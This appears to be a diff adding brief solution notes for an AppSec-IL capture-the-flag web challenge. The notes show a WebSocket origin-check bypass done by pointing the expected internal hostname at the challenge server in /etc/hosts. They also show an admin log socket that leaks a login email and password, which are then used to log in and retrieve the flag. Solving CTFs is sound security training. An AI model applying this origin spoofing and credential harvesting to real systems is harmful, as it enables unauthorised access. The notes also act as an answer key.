@@ -1,0 +1,18 @@
+https://badroute.appsecil.ctf.today/main.b8c73a19106d54f04466.js
+	new WebSocket("wss://securityocean.corp.local/admin/log")
+
+const s = new WebSocket('wss://badroute.appsecil.ctf.today/admin/log')
+	{"error":"Bad origin provided, abort connection. Expect: ['securityocean.corp.local']"}
+
+/etc/hosts
+18.134.59.71 securityocean.corp.local
+
+Go to https://securityocean.corp.local
+const s = new WebSocket('wss://badroute.appsecil.ctf.today/admin/log')
+	{"msg":{"email":"livnaAppSec@hotmail.com","pass":"tSec43PasswordLivna "},"error":"Incorrect username or password."}	
+
+https://badroute.appsecil.ctf.today/login
+	email: livnaAppSec@hotmail.com
+	pass: tSec43PasswordLivna
+
+AppSec-IL{Th3_W3bS0ckets_N33ds_2BS3cre}
